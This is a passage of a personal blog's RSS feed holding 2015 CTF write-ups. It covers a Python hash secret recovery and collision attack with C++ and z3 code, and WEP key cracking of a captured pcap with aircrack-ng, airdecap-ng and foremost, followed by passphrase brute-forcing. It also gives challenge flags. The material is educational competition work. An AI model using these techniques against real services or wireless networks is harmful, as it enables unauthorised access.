+8 : TMCTF{HOFMDKCJAIBKCJBKDMELCJBKDMELDMFOGNELDMFOGNFOHPGNFMDKBIA}
+</pre>
+<p class="p1">My final code below:</p>
+<p>View the code on <a href="https://gist.github.com/vhqtvn/288acbdf1ceebeceacf9">Gist</a>.<br />
+</div></div>
+<p class="p1"><strong><span class="s1">Trend Micro CTF 2015 &#8211; Programming 500</span></strong></p>
+<div class="su-spoiler su-spoiler-style-default su-spoiler-icon-arrow su-spoiler-closed"><div class="su-spoiler-title"><span class="su-spoiler-icon"></span>Show problem description</div><div class="su-spoiler-content su-clearfix" style="display:none">
+<p class="p1">(From my memory) Find probability of winning if user decide to hit or stand in international 104-cards blackjack, assume that player already has 2 cards: Aces and 2 and dealer has 3.</p>
+</div></div><div class="su-spoiler su-spoiler-style-default su-spoiler-icon-plus su-spoiler-closed"><div class="su-spoiler-title"><span class="su-spoiler-icon"></span>Solution</div><div class="su-spoiler-content su-clearfix" style="display:none">
+<p class="p1">I did not solve this problem in contest time, but after a day thinking i found out that it&#8217;s quite easy.</p>
+<p>View the code on <a href="https://gist.github.com/vhqtvn/cb57ea18d56d575e933b">Gist</a>.</p>
+</div></div>
+<p class="p1"><strong><span class="s1">Trend Micro CTF 2015 &#8211; Crypto</span><span class="s1"> 500</span></strong></p>
+<div class="su-spoiler su-spoiler-style-default su-spoiler-icon-arrow su-spoiler-closed"><div class="su-spoiler-title"><span class="su-spoiler-icon"></span>Show problem description</div><div class="su-spoiler-content su-clearfix" style="display:none">
+<p class="p1"><span class="s1">Think about two different alphabetical strings with the same lengths.</span></p>
+<p class="p1"><span class="s1">After you encode the strings with Base64 respectively, if you find characters located in the same position between the two strings, then you may want to extract them.</span></p>
+<p class="p1"><span class="s1">You may find examples where the final strings are ‘2015’ and ‘Japan’ if you place the extracted characters from left to right in order.</span></p>
+<p class="p1"><span class="s1">Example:</span></p>
+<ul class="ul1">
+<li class="li2"><span class="s1">CaEkMbVnD→(Base64)→Q</span><span class="s2"><b>2</b></span><span class="s1">FFa</span><span class="s2"><b>01</b></span><span class="s1">iVm</span><span class="s2"><b>5</b></span><span class="s1">E</span></li>
+<li class="li2"><span class="s1">GePoMjXNW→(Base64)→R</span><span class="s2"><b>2</b></span><span class="s1">VQb</span><span class="s2"><b>01</b></span><span class="s1">qWE</span><span class="s2"><b>5</b></span><span class="s1">X</span></li>
+</ul>
+<ul class="ul1">
+<li class="li2"><span class="s1">aBckjTiRgbpS→(Base64)→YU</span><span class="s2"><b>J</b></span><span class="s1">j</span><span class="s2"><b>a</b></span><span class="s1">2</span><span class="s2"><b>p</b></span><span class="s1">U</span><span class="s2"><b>a</b></span><span class="s1">VJnY</span><span class="s2"><b>n</b></span><span class="s1">BT</span></li>
+<li class="li2"><span class="s1">URehZQjLyvwk→(Base64)→VV</span><span class="s2"><b>J</b></span><span class="s1">l</span><span class="s2"><b>a</b></span><span class="s1">F</span><span class="s2"><b>p</b></span><span class="s1">R</span><span class="s2"><b>a</b></span><span class="s1">kx5d</span><span class="s2"><b>n</b></span><span class="s1">dr</span></li>
+</ul>
+<p class="p1"><span class="s1">Character &#8216;a&#8217; may appear in the extracted string like the example above, character </span><span class="s2"><b>&#8216;f&#8217;*</b></span><span class="s1"> will never appear.</span></p>
+<p class="p1"><span class="s1">Please find a list of characters that would not appear in the extracted string, even if you specify any alphabetical characters in the input.</span></p>
+<p class="p1"><span class="s1">Once you come up with a list of characters, please sort the characters in the order of ASCII table and generate a SHA1 hash value in lower case.</span></p>
+<p class="p1"><span class="s1">This is the flag you are looking for.</span></p>
+<p class="p1"><span class="s1">Please submit the flag in the format of &#8216;TMCTF{&lt;flag&gt;}&#8217;.</span></p>
+<p class="p1"><span class="s2"><b>*</b></span><span class="s1">Note: Previous description suggested &#8216;A&#8217; will never appear. We apologise for any inconvenience.</span></p>
+</div></div><div class="su-spoiler su-spoiler-style-default su-spoiler-icon-plus su-spoiler-closed"><div class="su-spoiler-title"><span class="su-spoiler-icon"></span>Solution</div><div class="su-spoiler-content su-clearfix" style="display:none">
+<p class="p1">Alphabetical character <code class="EnlighterJSRAW" data-enlighter-language="null">[a-z|A-Z]</code> has hex range <code class="EnlighterJSRAW" data-enlighter-language="null">41-5A, 61-7A</code>, or binary range <code class="EnlighterJSRAW" data-enlighter-language="null">0100 0001 - 0101 1010, 0110 0001 - 0111 1010</code>.</p>
+<p class="p1">In base64 encoding, a group of 3 input byte will be grouped into 4 output base64 byte (3*8 bit = 4*6 bit), we can now calculate the value range for each base64 byte:</p>
+<pre class="EnlighterJSRAW" data-enlighter-theme="eclipse">1st base64 byte: 010000-010110 + 011000-011110 = .... lol, should we do it by hand?
+</pre>
+<p>View the code on <a href="https://gist.github.com/vhqtvn/c6922f2b6955714488bf">Gist</a>.</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="null">+/f
+TMCTF{eb2cb19785a3c3bdbba6e1657fbb901097fedc63}</pre>
+</div></div>
+]]></content:encoded>
+			<wfw:commentRss>https://www.vhn.vn/blog/index.php/2015/09/28/writeup-trendmicro-2015/feed/</wfw:commentRss>
+		<slash:comments>0</slash:comments>
+	<post-id xmlns="com-wordpress:feed-additions:1">8</post-id>	</item>
+		<item>
+		<title>[Writeup] Plaid CTF 2015 &#8211; radhos</title>
+		<link>https://www.vhn.vn/blog/index.php/2015/04/20/writeup-plaid-ctf-2015-radhos/</link>
+		<comments>https://www.vhn.vn/blog/index.php/2015/04/20/writeup-plaid-ctf-2015-radhos/#respond</comments>
+		<pubDate>Mon, 20 Apr 2015 11:18:04 +0000</pubDate>
+		<dc:creator><![CDATA[vanhoavn]]></dc:creator>
+				<category><![CDATA[CTF]]></category>
+
+		<guid isPermaLink="false">https://www.vhn.vn/blog/?p=26</guid>
+		<description><![CDATA[Category: Web Points: 250 Description: A web scale key value store, for your enjoyment! Should be working Running at 52.6.62.188 port 9009 64-bit collision approach I didn&#8217;t solve this problem within the contest time, but<a class="read-more" href="https://www.vhn.vn/blog/index.php/2015/04/20/writeup-plaid-ctf-2015-radhos/">Continue reading</a>]]></description>
+				<content:encoded><![CDATA[<p><strong>Category:</strong> Web</p>
+<p><strong>Points:</strong> 250</p>
+<p><strong>Description:</strong></p>
+<blockquote><p>
+  A web scale key value store, for your enjoyment!</p>
+<p>  Should be working<br />
+  Running at 52.6.62.188 port 9009
+</p></blockquote>
+<h2>64-bit collision approach</h2>
+<p>I didn&#8217;t solve this problem within the contest time, but it&#8217;s here finally <img src="https://s.w.org/images/core/emoji/11/72x72/1f642.png" alt="🙂" class="wp-smiley" style="height: 1em; max-height: 1em;" /></p>
+<p>First, let&#8217;s take a quick look on provided script:</p>
+<p>View the code on <a href="https://gist.github.com/vhqtvn/0095c863af9098a0394e">Gist</a>.</p>
+<p>It&#8217;s a web service which provide key-value storage functions via JSON requests, keys are stored using its masked hash value using python&#8217;s built in hash function. So I decided it a collision-finding problem. At first, looking at this line:</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="python">assert (hash('PPP') != 2149279368079130035)
+</pre>
+<p>Which made me thought that python is running using version 3.4 with new SIPHASH24 hash algorithm and SPENT A DAY TO CRACK SIPHASH without success&#8230; (poor me :(). When i could manage to talk with w~ about this problem, i realized that it&#8217;s only the old hash function with randomized secret keys.</p>
+<p>A quick search on python source code gave me the implementation of its string hashing:</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="cpp">static long
+string_hash(PyStringObject *a)
+{
+    register Py_ssize_t len;
+    register unsigned char *p;
+    register long x;
+
+#ifdef Py_DEBUG
+    assert(_Py_HashSecret_Initialized);
+#endif
+    if (a-&gt;ob_shash != -1)
+        return a-&gt;ob_shash;
+    len = Py_SIZE(a);
+    /*
+      We make the hash of the empty string be 0, rather than using
+      (prefix ^ suffix), since this slightly obfuscates the hash secret
+    */
+    if (len == 0) {
+        a-&gt;ob_shash = 0;
+        return 0;
+    }
+    p = (unsigned char *) a-&gt;ob_sval;
+    x = _Py_HashSecret.prefix;
+    x ^= *p &lt;&lt; 7; while (--len &gt;= 0)
+        x = (1000003*x) ^ *p++;
+    x ^= Py_SIZE(a);
+    x ^= _Py_HashSecret.suffix;
+    if (x == -1)
+        x = -2;
+    a-&gt;ob_shash = x;
+    return x;
+}
+</pre>
+<p>Quite simple huh, start with an const, mul and or rounds, and ending by xor with its length and another const. Problem was that we dont know the value of _Py_HashSecret.prefix and _Py_HashSecret.suffix, let&#8217;s call them A and B from now on. As the calculation is based on simple operations only, we can use tools like z3 to solve the SMT model, but due to laggy internet, I decided to leave that path. Let&#8217;s calculate some simple hashes:</p>
+<ul>
+<li>Hash value of &#8220;\x00&#8221; * 1 : (1000003 * A) xor 1 xor B</li>
+<li>Hash value of &#8220;\x00&#8221; * 2 : (1000003 * 1000003 * A) xor 2 xor B</li>
+<li>Hash value of &#8220;\x00&#8221; * 3 : (1000003 * 1000003 * 1000003 * A) xor 3 xor B</li>
+</ul>
+<p>From above formulas, I can reduce B by xor the hash of 2 strings, make it a formula with only A:</p>
+<ul>
+<li>(Hash value of &#8220;\x00&#8221; * 1) xor (Hash value of &#8220;\x00&#8221; * 2) = (1000003 * A) xor 1 xor (1000003 * 1000003 * A) xor 2</li>
+<li>(Hash value of &#8220;\x00&#8221; * 2) xor (Hash value of &#8220;\x00&#8221; * 3) = (1000003 * 1000003 * A) xor 2 xor (1000003 * 1000003 * 1000003 * A) xor 3</li>
+</ul>
+<p>Now how can we sove that for A? As its type is long on 64 bits machine, we can&#8217;t do a full bruteforce search.</p>
+<p>There&#8217;s an interesting feature of multiplication and xor is that the suffix of result if equal to operation result of suffixes of its operants. i.e. 0x1213<em>0x3456 = 0x3B1EE62 while 0x13</em>0x56 = 0x662, both share the same byte suffix. Using this we can solve for its value byte-byte-byte.</p>
+<p>First, let&#8217;s calculate the hash value of some strings first:</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="cpp">/*Hash value of "\x00" * i */
+long hashArr[]={0l,
+7848190082587965582,
+-3458030773997347889,
+-4582483746743215612,
+4410049638523290193,
+6253908765636887514,
+7892342918428438971,
+4812826225314830288,
+-3580448393237491763,
+-3802863708583786458,
+7877484284146754215,
+};
+Sample sample[] = {
+     Sample("testing",7,-6690661205054787548),
+     Sample("vanhoa",6,4054411468809426790),
+     Sample("ldfsjl",6,-1154596901575536268),
+     Sample("2cm834mc803c23-",15,-3744132313005259935),
+};
+</pre>
+<p>Using these values, we can generate all possible values for A and B using:</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="cpp">vector&lt;long&gt; possP;
+possP.push_back(0);
+for(int b=1;b&lt;=8;b++){
+    vector possP2;
+    for(long i=0;i&lt;256;i++){
+        for(int k=0;k&lt;possP.size();k++){
+            long pp = possP[k] + (i&lt;&lt;(8*(b-1)));
+            int valid12 = (((M * pp) ^ 1 ^ (M * M * pp) ^ 2 ^ hashArr[1] ^ hashArr[2]) &amp; ((1ll&lt;&lt;(8*b))-1))==0;
+            int valid23 = (((M * M * pp) ^ 2 ^ (M * M * M * pp) ^ 3 ^ hashArr[2] ^ hashArr[3]) &amp; ((1ll&lt;&lt;(8*b))-1))==0;
+            int valid34 = (((M * M * M * pp) ^ 3 ^ (M * M * M * M * pp) ^ 4 ^ hashArr[3] ^ hashArr[4]) &amp; ((1ll&lt;&lt;(8*b))-1))==0;
+            if(valid12 &amp;&amp; valid23 &amp;&amp; valid34){
+                possP2.push_back(pp);
+            }
+        }
+    }
+    possP = possP2;
+}
+</pre>
+<p>And then verify the results with provided samples:</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="cpp">vector&lt;pair&lt;long,long&gt; &gt; r;
+for(int k=0;k&lt;possP.size();k++){
+    long p = possP[k];
+    long q = (p * M) ^ 1 ^ hashArr[1];
+    long x = p;
+    bool valid = true;
+    for(int len=1;valid &amp;&amp; len&lt;=hashMax;len++){
+        x = (1000003*x);
+        if((x^len^q) != hashArr[len]) valid = false;
+    }
+    for(int i=0;i&lt;sampleLen;i++){
+        if(pythonHash(sample[i].inp,sample[i].len,p,q)!=sample[i].hash) valid = false;
+    }
+    if(valid){
+        r.push_back(make_pair(p, q));
+    }
+}
+</pre>
+<p>Using this method, i can (always) obtain 2 possible values pair for A and B, so i decided to use only the first one.</p>
+<p>From this point, A and B are known, so we can simulate the hashing function locally. Now we must find collision for string &#8220;you_want_it_LOLOLOL?&#8221;.</p>
+<p>The hashing value is 64 bits, so we have to search on a 64-bit space to obtain the collision, after some simple test on small strings, i think this hashing is nearly unique for them, which lead me to consider only in 8-byte strings. Thinking the hash function as a finity state graph, starting at A, we can go to next hash number using current character of input string. A full BFS rooting from A will require 2^64 nodes to be visited, which is impossible for our normal computer. We can try BFS from both side: the source node and the target node, and check if they can visit a common node, but this approach is for 128GB computer only &#8211; as we have to save hash (8 byte each) of 2^32 values, which require approx. 34GB RAM.</p>
+<p>My last step to solve this problem is optimizing this: BFS only 3 bytes from each node, and try to do something for the remain 2 bytes (8-3*2 bytes). The first approach should be 256^2 loop:</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="python">    for char1 in range(256):
+        for char2 in range(256):
+            TWO_WAY_BFS()
+</pre>
+<p>which should require some hours to finish. Looking more deeply on the hashing algorithm bring me an idea:</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="cpp">    the assigment x = (1000003*x) ^ *p++; which our controlled p can assign any value to the LSByte of x!
+</pre>
+<p>So a byte can be obmitted from the search because it can be calculated using next and previous values, which reduce the searching space to 7 bytes, the obmitted byte will be the glue of 2 BFSs.</p>
+<p>Finally making it run 8 processes in parallel and we got the flag <em>flag{wh0_n3edz22Z22zZ_p3p456}</em>.</p>
+<p>View the code on <a href="https://gist.github.com/vhqtvn/e0e545577a518e429d98">Gist</a>.</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="null">RSIZE = 2
+Found A = 0x1d0e2c73d04d2feb; B= 0xb01eedc54b35180e
+[22] Result 22 : 1
+ -7368800807082251008
+SolveLeft 2 256
+SolveLeft 3 65536
+SolveLeft- 4 16777216
+SOLVE LEFT RESULT: 00ba9057 99bcc2b521402d3a ac0276917b41cb3e 426e84fc91cabcb4
+SolveRight 1 1
+SolveRight 2 256
+SolveRight 3 65536
+SOLVE RIGHT RESULT: 009b5da9 99bcc2b521402de5
+Result: \xba\x90\x57\x22\xdf\xa9\x5d\x9b
+Killed: 9</pre>
+<p>For the session with given A and B, the collision string for <code>you_want_it_LOLOLOL?</code> was <code>\xba\x90\x57\x22\xdf\xa9\x5d\x9b</code> with the same hash value 0x2fdd3e3f58ce3f70.</p>
+<h2>32-bit collision approach</h2>
+<p>Here&#8217;s python collision finding using z3:</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="python">#!/usr/bin/python
+
+from z3 import *
+
+x = BitVecs('x1 x2 x3 x4 x5 x6 x7 x8',8)
+
+A = 0x1d0e2c73d04d2feb
+B = 0xb01eedc54b35180e
+
+def xhash(a, A, B):
+    l = len(a)
+    x = A
+    x = x ^ (ZeroExt(56,a[0]) &lt;&lt; 7) l -= 1 i = 0 while l &gt;= 0:
+        x = (x * 1000003) ^ ZeroExt(56,a[i])
+        i += 1
+        l -= 1
+    x = x ^ len(a)
+    x = x ^ B
+    return x
+
+s = Solver()
+s.add(xhash(x, A, B) &amp; 0xFFFFFFFF == 0x39e0776e)
+
+print s
+print 'start!'
+print 'sat:',s.check()
+m = s.model()
+print m
+</pre>
+<p>This program can run under 1 minute on my machine.</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="python">        [(((((((((2093659752701439979 ^ ... &lt;&lt; ...)*1000003 ^
+                 ZeroExt(56, x1))*
+                1000003 ^
+                ZeroExt(56, x2))*
+               1000003 ^
+               ZeroExt(56, x3))*
+              1000003 ^
+              ZeroExt(56, x4))*
+             1000003 ^
+             ZeroExt(56, x5))*
+            1000003 ^
+            ZeroExt(56, x6))*
+           1000003 ^
+           ZeroExt(56, x7))*
+          1000003 ^
+          ZeroExt(56, x8) ^
+          8 ^
+          12690842231602747406) &amp;
+         4294967295 ==
+         971011950]
+        start!
+        sat: sat
+        [x8 = 163,
+         x3 = 28,
+         x2 = 162,
+         x1 = 0,
+         x4 = 175,
+         x5 = 217,
+         x6 = 114,
+         x7 = 100]
+</pre>
+]]></content:encoded>
+			<wfw:commentRss>https://www.vhn.vn/blog/index.php/2015/04/20/writeup-plaid-ctf-2015-radhos/feed/</wfw:commentRss>
+		<slash:comments>0</slash:comments>
+	<post-id xmlns="com-wordpress:feed-additions:1">26</post-id>	</item>
+		<item>
+		<title>[Writeup] CodeGate CTF 2015 &#8211; Quals &#8211; good-crypto</title>
+		<link>https://www.vhn.vn/blog/index.php/2015/03/16/writeup-codegate-ctf-2015-quals-good-crypto/</link>
+		<comments>https://www.vhn.vn/blog/index.php/2015/03/16/writeup-codegate-ctf-2015-quals-good-crypto/#respond</comments>
+		<pubDate>Sun, 15 Mar 2015 18:13:07 +0000</pubDate>
+		<dc:creator><![CDATA[vanhoavn]]></dc:creator>
+				<category><![CDATA[CTF]]></category>
+
+		<guid isPermaLink="false">http://www.vhn.vn/blog/?p=35</guid>
+		<description><![CDATA[Category: Programming Points: 500 Description: Binary : http://binary.grayhash.com/bd24de5d345c0d1da274fcd7d9a2b244/file.xz We recently intercepted some kind of encrypted traffic, can you help us recover the password? Update: Due to a crappy javascript programmer there&#8217;s one line of code<a class="read-more" href="https://www.vhn.vn/blog/index.php/2015/03/16/writeup-codegate-ctf-2015-quals-good-crypto/">Continue reading</a>]]></description>
+				<content:encoded><![CDATA[<p><strong>Category:</strong> Programming</p>
+<p><strong>Points:</strong> 500</p>
+<p><strong>Description:</strong></p>
+<blockquote><p>Binary : <a href="file.xz">http://binary.grayhash.com/bd24de5d345c0d1da274fcd7d9a2b244/file.xz</a><br />
+We recently intercepted some kind of encrypted traffic, can you help us recover the password?</p>
+<p>Update: Due to a crappy javascript programmer there&#8217;s one line of code missing, but I&#8217;m sure you can figure out which one</p></blockquote>
+<h2>Write-up</h2>
+<p>The provided file is a compressed pcap file on a WEP-encrypted wireless network.</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="null">14:52:22.194582 WEP Encrypted 44us CF +QoS Data IV:ed006c Pad 0 KeyID 0
+</pre>
+<p>Let&#8217;s crack the key using aircrack-ng:</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="shell" data-enlighter-theme="twilight">&gt; aircrack-ng file.pcap
+Opening file.pcap
+Read 45169 packets.
+
+   #  BSSID              ESSID                     Encryption
+
+   1  00:26:66:55:97:D6  cgnetwork                 WEP (15477 IVs)
+
+Choosing first network as target.
+
+Opening file.pcap
+Attack will be restarted every 5000 captured ivs.
+Starting PTW attack with 15477 ivs.
+
+                                                                                Aircrack-ng 1.2 rc1
+
+
+                                                                [00:00:00] Tested 103 keys (got 15477 IVs)
+
+   KB    depth   byte(vote)
+    0    0/  1   A4(22784) 62(20992) A8(19968) B6(19968) 42(19456) 6E(19456) 91(19200) B7(19200) 26(18944) 9E(18944) 68(18944) E4(18688) 0E(18688) 74(18688)
+    1    0/  1   3D(23040) 51(20736) 07(20480) 62(19968) 7B(19968) 1F(19712) B0(19712) BD(19456) 85(19200) 9D(19200) 80(19200) EC(18944) 13(18944) 98(18688)
+    2    0/  1   F6(23808) E4(20992) D0(20736) 68(20224) 95(19712) 38(19456) 0C(19200) F7(18944) 45(18944) A8(18944) 4F(18944) C5(18688) CB(18688) BB(18688)
+    3    1/ 10   F3(20480) D0(19968) C5(19968) 3E(19712) 52(19456) B2(19456) 09(19456) 20(19456) 43(19456) A0(19200) 8F(19200) B0(19200) 04(18944) 8D(18944)
+    4    8/ 11   67(19456) 52(19456) F9(19456) 5C(19456) 20(19456) 45(18944) D3(18944) 95(18944) 85(18944) 9D(18688) 3A(18688) C8(18688) 40(18688) 1E(18432)
+
+                         KEY FOUND! [ A4:3D:F6:F3:74 ]
+    Decrypted correctly: 100%</pre>
+<p>Yes, that was easy, now we can decrypt the traffic:</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="shell" data-enlighter-theme="twilight">&gt; airdecap-ng -w A4:3D:F6:F3:74 file.pcap
+Total number of packets read         45169
+Total number of WEP data packets     15477
+Total number of WPA data packets         0
+Number of plaintext data packets         0
+Number of decrypted WEP  packets     15477
+Number of corrupted WEP  packets         0
+Number of decrypted WPA  packets         0</pre>
+<p>Still don&#8217;t need wireshark, use foremost to extract the files:</p>
+<p>&nbsp;</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="shell" data-enlighter-theme="twilight">&gt; foremost -v file-dec.pcap
+
+Foremost version 1.5.7 by Jesse Kornblum, Kris Kendall, and Nick Mikus
+Audit File
+
+Foremost started at Mon Mar 16 16:24:49 2015
+Invocation: foremost -v file-dec.pcap
+Output directory: /Users/Shared/dev/ctf/codegat/p500/output
+Configuration file: /usr/local/etc
+Processing: file-dec.pcap
+|------------------------------------------------------------------
+File: file-dec.pcap
+Start: Mon Mar 16 16:24:49 2015
+Length: Unknown
+
+Num  Name (bs=512)         Size  File Offset     Comment
+
+0:  00000104.jpg         258 KB           53549
+1:  00004538.jpg          87 KB         2323670
+2:  00000406.gif           35 B          208185       (1 x 1)
+3:  00001260.gif           35 B          645564       (1 x 1)
+4:  00002450.gif           42 B         1254588       (1 x 1)
+5:  00003653.gif           35 B         1870635       (1 x 1)
+6:  00003719.gif           35 B         1904213       (1 x 1)
+7:  00010456.gif           49 B         5353479       (1 x 1)
+8:  00010876.gif           35 B         5568641       (1 x 1)
+9:  00001639.htm           67 B          839396
+10: 00024427.htm           1 KB        12506741
+11: 00001765.png          283 B          904100       (44 x 44)
+12: 00001831.png          166 B          937711       (12 x 12)
+13: 00010214.png           67 B         5229704       (1 x 1)
+14: 00010671.png          110 B         5464006       (1 x 400)
+15: 00020736.png          425 B        10616910       (19 x 19)
+16: 00024242.png          589 B        12412171       (19 x 19)
+*|
+Finish: Mon Mar 16 16:24:49 2015
+
+17 FILES EXTRACTED
+
+jpg:= 2
+gif:= 7
+htm:= 2
+png:= 6
+------------------------------------------------------------------</pre>
+<p>The secret is in this html:</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="html">&lt;html&gt;
+&lt;head&gt;
+    &lt;title&gt;Router - index&lt;/title&gt;
+    &lt;link href="static/css/bootstrap.min.css" rel="stylesheet" media="screen"&gt;
+    &lt;link href="static/css/bootstrap-responsive.min.css" rel="stylesheet" media="screen"&gt;
+    &lt;link href="static/css/blah.css" rel="stylesheet"&gt;
+
+    &lt;script src="static/js/sha1.js"&gt;&lt;/script&gt;
+
+    &lt;script&gt;
+        function validate() {
+            var x = document.forms["formxx"]["pwz"].value;
+            if (x == null || x == "") {
+                alert("Password must be filled out");
+                return false;
+            }
+
+            if (!x.match("/^[A-Za-z]+$/")) {
+                alert("Bad charset");
+                return false;
+            }
+
+            if (!sha1(x).match("^ff7b948953ac"))
+            {
+
+            }
+
+            alert("Flag: " + x);
+            return true;
+        }
+    &lt;/script&gt;
+
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;div class="box"&gt;
+        &lt;center&gt;
+            &lt;h1&gt;Router - Please log in&lt;/h1&gt;
+        &lt;/center&gt;
+        &lt;br/&gt;
+        &lt;br/&gt;
+
+
+
+
+        &lt;form class="box" method="post" onSubmit="validate()" name="formxx" action="/login"&gt;
+            &lt;h2 class="box-heading"&gt;Login&lt;/h2&gt;
+            &lt;input type="text" class="input-block-level" placeholder="Username" name="user" value="admin"&gt;
+            &lt;input type="password" name="pwz" class="input-block-level" placeholder="WEP passhrase" name="pw"&gt;
+            &lt;input type="submit" name="submit" value="Submit" /&gt;
+        &lt;/form&gt;
+    &lt;/div&gt;
+
+    &lt;script src="static/js/jquery-1.10.2.min.js"&gt;&lt;/script&gt;
+    &lt;script src="static/js/bootstrap.min.js"&gt;&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre>
+<p>Well, now let&#8217;s sum up all the information:</p>
+<ul>
+<li>We need to find a password with charset [a-zA-Z]+, having sha1 value starting with &#8220;ff7b948953ac&#8221; (from javascript code).</li>
+<li>The password is WEP&#8217;s Passphrase (indicated in placeholder of the input box).</li>
+<li>WEP&#8217;s key corresponding to the Passphrase is A4:3D:F6:F3:74.</li>
+</ul>
+<p>Using the first hint only, I wrote a brute force script for it and had it run up to 6 characters without success.</p>
+<p>WEP&#8217;s key generator is mostly using simple xor and PRNG:</p>
+<p><a href="https://i2.wp.com/www.vhn.vn/blog/wp-content/uploads/2015/09/wep.png"><img data-attachment-id="36" data-permalink="https://www.vhn.vn/blog/index.php/2015/03/16/writeup-codegate-ctf-2015-quals-good-crypto/wep/" data-orig-file="https://i2.wp.com/www.vhn.vn/blog/wp-content/uploads/2015/09/wep.png?fit=662%2C482&amp;ssl=1" data-orig-size="662,482" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="wep" data-image-description="" data-medium-file="https://i2.wp.com/www.vhn.vn/blog/wp-content/uploads/2015/09/wep.png?fit=300%2C218&amp;ssl=1" data-large-file="https://i2.wp.com/www.vhn.vn/blog/wp-content/uploads/2015/09/wep.png?fit=662%2C482&amp;ssl=1" class="size-medium wp-image-36 aligncenter" src="https://i1.wp.com/www.vhn.vn/blog/wp-content/uploads/2015/09/wep-300x218.png?resize=300%2C218" alt="WEP key generation algorithm" width="300" height="218" srcset="https://i2.wp.com/www.vhn.vn/blog/wp-content/uploads/2015/09/wep.png?resize=300%2C218&amp;ssl=1 300w, https://i2.wp.com/www.vhn.vn/blog/wp-content/uploads/2015/09/wep.png?resize=520%2C379&amp;ssl=1 520w, https://i2.wp.com/www.vhn.vn/blog/wp-content/uploads/2015/09/wep.png?w=662&amp;ssl=1 662w" sizes="(max-width: 300px) 100vw, 300px" data-recalc-dims="1" /></a></p>
+<p>The seed&#8217;s efficient value space is only 24 bits, so we can find the original hash easily:<br />
+View the code on <a href="https://gist.github.com/vhqtvn/ed163c30000405149a4e">Gist</a>.</p>
+<p>Output:</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="shell" data-enlighter-theme="twilight">('Found it: ', '0x12766b')
+Verify:
+('0xa4', '0xa4a782')
+('0x3d', '0x3d303d')
+('0xf6', '0xf6420c')
+('0xf3', '0xf3089f')
+('0x74', '0x74c0e6')</pre>
+<p>So we have the seed value now, and:</p>
+<ul>
+<li>sumxor(p[4k])=0x6b</li>
+<li>sumxor(p[4k+1])=0x76</li>
+<li>sumxor(p[4k+2])=0x12</li>
+</ul>
+<p>The passphrase length is longer than 6, so from this i can guess the passphrase length is 10 (as passhrase is ascii, we just need to look at msb of the result to guess). I was feeling stupid to see how long can my original bruteforce script need to brute these 10 characters.</p>
+<p>Let&#8217;s rewrite the relations in more readable form:</p>
+<ul>
+<li>p[0] xor p[4] xor p[8] = 0x6b</li>
+<li>p[1] xor p[5] xor p[9] = 0x76</li>
+<li>p[2] xor p[6] = 0x12</li>
+</ul>
+<p>Using these relations, the key space is still 7 characters, cracking that for charset of 52 values should take hours, so i tried to install cuda toolkit to use gpu, but my crappy internet dont allow me to do so. From the relation, in both set {p[0], p[4], p[8]}, {p[1], p[5], p[9]}, there must be 2 uppercase letters or no letter at all for each set, so I guessed that all characters are lowercase. Now let&#8217;s run a bruteforce script for lowercase charset:</p>
+<p>View the code on <a href="https://gist.github.com/vhqtvn/4ff6fe679f313be3a8ea">Gist</a>.</p>
+<p>Wait some tens of seconds and we have the key: <strong>cgwepkeyxz</strong>.</p>
+<p>Thanks CodeGate for this interesting &#8220;programming&#8221; problem <img src="https://s.w.org/images/core/emoji/11/72x72/1f642.png" alt="🙂" class="wp-smiley" style="height: 1em; max-height: 1em;" /></p>
+]]></content:encoded>
+			<wfw:commentRss>https://www.vhn.vn/blog/index.php/2015/03/16/writeup-codegate-ctf-2015-quals-good-crypto/feed/</wfw:commentRss>
+		<slash:comments>0</slash:comments>
+	<post-id xmlns="com-wordpress:feed-additions:1">35</post-id>	</item>
+	</channel>
+</rss>
